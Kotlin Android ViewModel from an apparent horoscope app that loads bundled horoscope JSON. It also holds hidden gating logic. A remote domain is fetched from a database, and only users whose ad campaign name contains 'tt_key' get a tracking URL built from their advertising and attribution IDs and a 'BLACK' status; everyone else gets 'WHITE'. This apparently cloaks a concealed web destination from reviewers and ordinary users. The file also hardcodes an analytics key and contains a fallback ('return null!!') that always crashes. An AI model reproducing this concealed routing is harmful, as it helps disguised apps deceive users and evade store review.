package com.wsoteam.horoscopes.presentation.main

import android.app.Application
import android.graphics.Color.WHITE
import android.util.Log
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.MutableLiveData
import androidx.lifecycle.ViewModel
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.google.firebase.analytics.FirebaseAnalytics
import com.squareup.moshi.JsonAdapter
import com.squareup.moshi.Moshi
import com.squareup.moshi.Types
import com.squareup.moshi.kotlin.reflect.KotlinJsonAdapterFactory
import com.wsoteam.horoscopes.App
import com.wsoteam.horoscopes.models.Global
import com.wsoteam.horoscopes.models.Sign
import com.wsoteam.horoscopes.models.Today
import com.wsoteam.horoscopes.models.Yesterday
import com.wsoteam.horoscopes.utils.Analytics
import com.wsoteam.horoscopes.utils.PreferencesProvider
import com.wsoteam.horoscopes.utils.URLMaker
import com.wsoteam.horoscopes.utils.db.DBCallbaks
import com.wsoteam.horoscopes.utils.db.DBWorker
import com.wsoteam.horoscopes.utils.loger.L
import com.wsoteam.horoscopes.utils.net.state.NetState
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch
import java.util.*

class MainVM(application: Application) : AndroidViewModel(application) {

    private val FIRST_FILE = "number1.json"
    private val SECOND_FILE = "number2.json"
    private val THIRD_FILE = "number3.json"

    private val PT_LOCALE = "pt"

    private var job = Job()
    private val vmScope = CoroutineScope(Dispatchers.Main + job)

    private val dataLD = MutableLiveData<List<Sign>>()

    private val CAMPAIGN_TAG = "campaign"
    val FB_PATH = "by"
    private val KEY_WORD = "tt_key"//
    private val ADVERT_ID = "advertising_id"

    private var status: MutableLiveData<Int>? = null

    private var isStartedOpen = false
    private var isStartedAps = false


    private var domain = ""
    private var naming = ""
    private var gadid = ""

    fun preLoadData() {
        L.log("preLoadData")
        if (NetState.isConnected()) {
            job = vmScope.launch {
                CacheData.setCachedData(getData())
            }
        }
    }

    fun reloadData() {
        L.log("reloadData")
        if (NetState.isConnected()) {
            job = vmScope.launch {
                dataLD.value = getData()
            }
        }
    }

    fun setupCachedData() {
        L.log("setupCachedData")
        if (CacheData.getCachedData() != null) {
            dataLD.value = CacheData.getCachedData()
            CacheData.clearCache()
        } else {

        }
    }


    fun getData(): List<Sign> {
        var path = getTodayPath()
        var json: String
        var moshi = Moshi.Builder().add(KotlinJsonAdapterFactory()).build()
        var listType = Types.newParameterizedType(List::class.java, Sign::class.java)
        var jsonAdapter = moshi.adapter<List<Sign>>(listType)
        try {
            var inputStream = App.getInstance().assets.open(path)
            var size = inputStream.available()
            var buffer = ByteArray(size)
            inputStream.read(buffer)
            inputStream.close()
            json = String(buffer, charset("UTF-8"))
            return jsonAdapter.fromJson(json)!!
        } catch (e: Exception) {
        }
        return null!!
    }

    private fun getTodayPath(): String {
        var counter = PreferencesProvider.pathCounter
        var lastEnterDay = PreferencesProvider.lastEnterDay
        var currentDay = Calendar.getInstance().get(Calendar.DAY_OF_YEAR)

        if (currentDay != lastEnterDay){
            PreferencesProvider.lastEnterDay = currentDay
            counter ++

            if (counter > PreferencesProvider.MAX_PATH_COUNTER){
                counter = 0
            }

            PreferencesProvider.pathCounter = counter
        }


        var listPaths = arrayListOf(FIRST_FILE, SECOND_FILE, THIRD_FILE)
        return listPaths[counter]
    }

    fun getLD(): MutableLiveData<List<Sign>> {
        L.log("getLD")
        return dataLD
    }

    ///////////////////////////////////////////////////
    private var appContext: App
        get() = getApplication<App>()
        set(value) {}


    fun  getStatusLD(): MutableLiveData<Int> {
        if (status == null) {
            status = MutableLiveData()
            startVerification()
            startAps()
        }
        return status!!
        //Log.e("LOOOL", "status:  $status")
    }

    private fun startVerification() {
        if (PreferencesProvider.url == PreferencesProvider.EMPTY_URL) {
            DBWorker.requestPercent(FB_PATH, object : DBCallbaks {

                override fun onSuccess(url: String) {
                    //Log.e("LOL", url)
                    Analytics.getDomain()
                    Analytics.setUserDomain(url)

                    domain = url
                    goNext()
                }

                override fun onError() {
                    status!!.postValue(WHITE)
                }
            })
        } else {
            status!!.value = BLACK
        }
    }

    private fun goNext() {
        if (domain != "" && naming != "" && gadid != "") {
            if (!isStartedOpen) {
                isStartedOpen = true
                if (naming.contains(KEY_WORD)) {
                    Analytics.setUserNaming(naming)
                    var afid = AppsFlyerLib.getInstance().getAppsFlyerUID(appContext)
                    var url = URLMaker.createLink(naming, domain, gadid, afid)
                    Analytics.setUserUrl(url)
                    PreferencesProvider.url = url
                    this.status!!.postValue(BLACK)
                } else {
                    status!!.postValue(WHITE)
                }
            }
        }
    }

    private fun startAps() {
        if (!isStartedAps) {
            isStartedAps = true
            val conversionDataListener = object : AppsFlyerConversionListener {
                override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {
                    data?.let { cvData ->
                       cvData.map {
                            //Log.e("LOL", "conversion_attribute:  ${it.key} = ${it.value}")
                        }

                        naming = (data!![CAMPAIGN_TAG] ?: "empty") as String
                        goNext()

                        gadid = (data!![ADVERT_ID] ?: "empty") as String
                        goNext()

                    }
                    //FirebaseAnalytics.getInstance(appContext.applicationContext).logEvent("onConversionDataSuccess", null)
                }

                override fun onConversionDataFail(error: String?) {
                    //Log.e("LOL", "onConversionDataFail")
                    //FirebaseAnalytics.getInstance(appContext.applicationContext).logEvent("onConversionDataFail", null)
                    status!!.postValue(WHITE)
                }

                override fun onAppOpenAttribution(data: MutableMap<String, String>?) {
                    //Log.e("LOL", "onAppOpenAttribution")
                    //FirebaseAnalytics.getInstance(appContext.applicationContext).logEvent("onAppOpenAttribution", null)
                }

                override fun onAttributionFailure(error: String?) {
                    //Log.e("LOL", "onAttributionFailure")
                    //FirebaseAnalytics.getInstance(appContext.applicationContext).logEvent("onAttributionFailure", null)
                    status!!.postValue(WHITE)
                }
            }

            AppsFlyerLib
                .getInstance()
                .init("fTHMhfusDFFptFAiXDJ2fU", conversionDataListener, appContext)
            AppsFlyerLib.getInstance().start(appContext)
        }
    }

    companion object {
        const val WHITE = 0
        const val BLACK = 1
    }
}